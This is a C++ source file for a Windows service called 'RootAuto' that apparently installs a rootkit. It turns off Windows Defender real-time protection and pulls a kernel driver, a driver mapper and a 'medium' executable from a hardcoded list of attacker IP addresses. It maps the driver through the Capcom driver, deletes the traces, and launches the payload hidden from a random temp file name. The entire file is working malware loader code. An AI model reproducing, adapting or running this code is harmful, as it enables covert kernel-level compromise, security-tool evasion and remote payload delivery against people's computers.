#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include "helpers.h"
#include "utils.h"
#include "services.h"


// Declerations for used functions -
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver


DWORD WINAPI ServiceMainThread(LPVOID lpParam)
{
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    HANDLE StatusFile = INVALID_HANDLE_VALUE;
    HANDLE TempFile = INVALID_HANDLE_VALUE;
    HANDLE MediumFile = INVALID_HANDLE_VALUE;
    HANDLE SafeHandle = INVALID_HANDLE_VALUE;

    PVOID MediumBuffer = NULL;
    PVOID SafeBuffer = NULL;
    DWORD MediumSize = 0;
    DWORD MediumRead = 0;
    DWORD MediumWritten = 0;
    DWORD SafeSize = 0;
    int existsi = 0;
    int LastErr = 0;

    BOOL GotIp = FALSE;
    BOOL GotMedium = FALSE;
    BOOL GotMapper = FALSE;
    BOOL DriverExists = TRUE;
    
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char TempPath[MAX_PATH] = { 0 };
    char RandMedium[MAX_PATH] = { 0 };
    char ExistingCommand[500] = { 0 };
    const char* DeleteExisting = "if exist * rmdir /s /q *";
    const char* MappingCommand = "C:\\nosusfolder\\verysus\\drvmap.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys";
    const char* CleaningCommands =
        "cd \"%ProgramFiles%\\Windows Defender\" && "
        "MpCmdRun.exe - Restore - All && "
        "sc stop Capcom && "
        "sc delete Capcom && "
        "del %windir%\\Capcom.sys";

    // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
    const char* AttackAddresses = "172.19.160.1~172.17.80.1~172.26.192.1~172.23.64.1~172.29.144.1~172.24.112.1~192.168.96.1~192.168.47.1~192.168.5.1~192.168.1.21~172.21.0.1~192.168.56.1";

    struct stat CheckExists = { 0 };
    struct stat ExistStatus = { 0 };
    char MediumName[MAX_PATH] = { 0 };

    // Disable Realtime Protection (after FunEngine not needed but for auto needed) -
    LastError = RealTime(TRUE);
    char CurrentPath[500] = { 0 };
    WcharpToCharp(CurrentPath, GetCurrentPath().c_str());

    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        return SpecialQuit(LastError.LastError, "C:\\nosusfolder\\verysus\\disable.txt", NULL, 0);
    }


    // Make sure calling command is syntaxed correctly and that driver is available -
    if (stat("C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys", &CheckExists) != 0) {
        if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\getipscreatedriver.txt", NULL, 0);
        }
        GotIp = TRUE;

        if (!FailSafe('D', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\failsafedriver.txt", NULL, 0);
        }

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "KMDFdriver.sys")) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\afterfailsafedriver.txt", NULL, 0);
        }
        DriverExists = FALSE;
    }

    // Make sure calling command is syntaxed correctly and that drvmap.exe is available -
    if (stat("C:\\nosusfolder\\verysus\\drvmap.exe", &CheckExists) != 0) {
        if (!GotIp) {
            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
                return SpecialQuit(0, "C:\\nosusfolder\\verysus\\getipscreatedrvmap.txt", NULL, 0);
            }
            GotIp = TRUE;
        }

        if (!FailSafe('P', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\failsafedrvmap.txt", NULL, 0);
        }

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "drvmap.exe")) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\afterfailsafedrvmap.txt", NULL, 0);
        }

        if (!DriverExists) {
            MappingCommand = "drvmap.exe KMDFdriver.sys";
        }
        else {
            MappingCommand = "drvmap.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys";
        }
    }
    else {
        if (!DriverExists) {
            MappingCommand = "C:\\nosusfolder\\verysus\\drvmap.exe KMDFdriver.sys";
        }
    }


    // Activate drvmap with driver as parameter -
    StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\mappingstatus.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    //WriteFile(StatusFile, MappingCommand, strlen(MappingCommand) + 1, NULL, NULL);
    LastErr = system(MappingCommand);
    if (LastError.LastError == -1) {
        LastError.LastError = GetLastError();
        WriteToStatus(LastError.LastError, StatusFile);
        CloseHandle(StatusFile);
        return SpecialQuit(LastError.LastError, "C:\\nosusfolder\\verysus\\system.txt", NULL, 0);
    }
    WriteToStatus(11111111, StatusFile);
    WriteToStatus(LastErr, StatusFile);
    CloseHandle(StatusFile);

    StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\cleaningstatus.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(StatusFile, CleaningCommands, strlen(CleaningCommands) + 1, NULL, NULL);
    CloseHandle(StatusFile);
    if (system(CleaningCommands) == -1) {
        return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\cleaningcommands.txt", NULL, 0);
    }


    // Enable Realtime Protection -
    LastError = RealTime(FALSE);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        return SpecialQuit(LastError.LastError, "C:\\nosusfolder\\verysus\\enable.txt", NULL, 0);
    }


    // Get medium data -
    MediumFile = CreateFileA("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (MediumFile == INVALID_HANDLE_VALUE) {
        if (stat("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", &CheckExists) == 0) {
            return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\readfrommederr.txt", NULL, 0);
        }

        if (!GotIp) {
            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
                return SpecialQuit(0, "C:\\nosusfolder\\verysus\\getipscreatemed.txt", NULL, 0);
            }
            GotIp = TRUE;
        }

        if (!FailSafe('M', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\failsafemed.txt", NULL, 0);
        }

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "MainMedium.exe")) {
            return SpecialQuit(0, "C:\\nosusfolder\\verysus\\afterfailsafemedium.txt", NULL, 0);
        }

        GotMedium = TRUE;
        MediumBuffer = SafeBuffer;
        MediumSize = SafeSize;
    }

    if (!GotMedium) {
        MediumSize = GetFileSize(MediumFile, NULL);
        if (MediumSize == 0) {
            HANDLE CloseArr[1] = { MediumFile };
            return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\getsizemed.txt", CloseArr, 1);
        }
        MediumBuffer = malloc(MediumSize);
        if (MediumBuffer == NULL) {
            HANDLE CloseArr[1] = {MediumFile};
            return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\allocatemed.txt", CloseArr, 1);
        }

        if (!ReadFile(MediumFile, MediumBuffer, MediumSize, &MediumRead, NULL) || MediumRead != MediumSize) {
            HANDLE CloseArr[1] = { MediumFile };
            free(MediumBuffer);
            return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\readmed.txt", CloseArr, 1);
        }
        CloseHandle(MediumFile);
    }


    // Get path to temp copy of medium file -
    if (GetTempPathA(MAX_PATH, TempPath) == 0) {
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\gettempmed.txt", NULL, 0);
    }
    GetRandomName(RandMedium, 20, ".exe");
    memcpy((PVOID)((ULONG64)TempPath + strlen(TempPath)), RandMedium, strlen(RandMedium) + 1);
    /*
    if (!DeleteFileA(TempPath)) {
        LastError.LastError = GetLastError();
        if (LastError.LastError != FILE_DOES_NOT_EXIST) {
            free(MediumBuffer);
            return SpecialQuit(LastError.LastError, "C:\\nosusfolder\\verysus\\deleteexistingtemp.txt", NULL, 0);
        }
    }
    */

    if (stat(TempPath, &ExistStatus) == 0) {
        GetServiceName(TempPath, MediumName);
        REPLACEMENT Rep = { MediumName, '*', 1 };
        REPLACEMENT RepArr[1] = { Rep };
        LastError.LastError = ExecuteSystem("taskkill /IM * /F", RepArr, 1);
        if (LastError.LastError != 0) {
            free(MediumBuffer);
            return SpecialQuit(LastError.LastError, "C:\\nosusfolder\\verysus\\stoppingandeletingexistingservice.txt", NULL, 0);
        }

        Rep = { TempPath, '*', 2 };
        RepArr[0] = Rep;
        LastError.LastError = ExecuteSystem("if exist * del /s /q *", RepArr, 1);
        if (LastError.LastError != 0) {
            free(MediumBuffer);
            return SpecialQuit(LastError.LastError, "C:\\nosusfolder\\verysus\\deleteexistingtemp.txt", NULL, 0);
        }
    }


    // Stop already running medium, remove source file -
    if (!DeletePrevious(TempPath)) {
        return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\deleteprevious.txt", NULL, 0);
    }

    StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\deletedprev.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CloseHandle(StatusFile);

    TempFile = CreateFileA(TempPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (TempFile == INVALID_HANDLE_VALUE) {
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\createtempmed.txt", NULL, 0);
    }

    StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\createdtemp.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CloseHandle(StatusFile);

    if (!WriteFile(TempFile, MediumBuffer, MediumSize, &MediumWritten, NULL) || MediumWritten != MediumSize) {
        HANDLE CloseArr[1] = { TempFile };
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "C:\\nosusfolder\\verysus\\writetempmed.txt", CloseArr, 1);
    }
    free(MediumBuffer);
    CloseHandle(TempFile);

    StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\tempmedsuccess.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CloseHandle(StatusFile);


    // Activate medium -
    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", TempPath, NULL, NULL, SW_HIDE);
    if ((INT_PTR)MediumProcess > 32) {
        StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\success.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(StatusFile);
        return ERROR_SUCCESS;
    }
    StatusFile = CreateFileA("C:\\nosusfolder\\verysus\\enable.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteToStatus((DWORD)MediumProcess, StatusFile);
    CloseHandle(StatusFile);
    return (DWORD)MediumProcess;
}


VOID WINAPI ServiceControlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (AutomaticService.ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        AutomaticService.ServiceStatus.dwControlsAccepted = 0;
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
        SetEvent(AutomaticService.StopEvent);  // Initiate the stop event - main working thread will be notified to stop working
        break;

    default:
        break;  // No need to handle any other type of events
    }
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
    DWORD Status = E_FAIL;

    // Register the service control handler with the SCM so its possible to control the service -
    AutomaticService.StatusHandle = RegisterServiceCtrlHandler(AutomaticService.ServiceName, ServiceControlHandler);
    if(AutomaticService.StatusHandle != NULL) {
        // Initialize service status with values to show service controller the service is starting -
        RtlZeroMemory(&AutomaticService.ServiceStatus, sizeof(AutomaticService.ServiceStatus));
        AutomaticService.ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_START_PENDING;  // Intending to eventually start
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
        AutomaticService.ServiceStatus.dwServiceSpecificExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 0;

        if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
            AutomaticService.StopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
            if (AutomaticService.StopEvent == NULL) {
                // Error creating the event that occurs when stopping the service (need to stop service manually) -
                AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped
                AutomaticService.ServiceStatus.dwWin32ExitCode = GetLastError();
                AutomaticService.ServiceStatus.dwCheckPoint = 1;
                SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
            }
            else {
                // Created stopping event successfully, proceed to start the service -
                AutomaticService.ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;  // Only accepted interaction with service is stopping it
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_RUNNING;  // Service is currently running
                AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESSFUL
                AutomaticService.ServiceStatus.dwCheckPoint = 0;
                if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
                    AutomaticService.MainThread = CreateThread(NULL, 0, ServiceMainThread, NULL, 0, NULL);
                    if (AutomaticService.MainThread != NULL) {
                        WaitForSingleObject(AutomaticService.MainThread, INFINITE);  // Wait for main thread to stop operating
                    }
                    CloseHandle(AutomaticService.StopEvent);  // Stop event not needed anymore

                    // Update final status of service (stopping after main operation) -
                    AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // No interaction with service should occur when stopping
                    AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped operating
                    AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
                    AutomaticService.ServiceStatus.dwCheckPoint = 3;
                    SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
                }
            }
        }
    }
    return;
}


int main(int argc, TCHAR* argv[])
{
    char AutoName[11] = "RootAuto";
    WCHAR WideAutoName[MAX_PATH];
    CharpToWcharp(AutoName, WideAutoName);
    AutomaticService.InitiateService(WideAutoName);
    AutomaticService.ServiceFile = "C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe";

    // Define the service table entry of the auto service (name, entrypoint ..) -
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {AutomaticService.ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };


    // Start the service control dispatcher (used by SCM to call the service) -
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}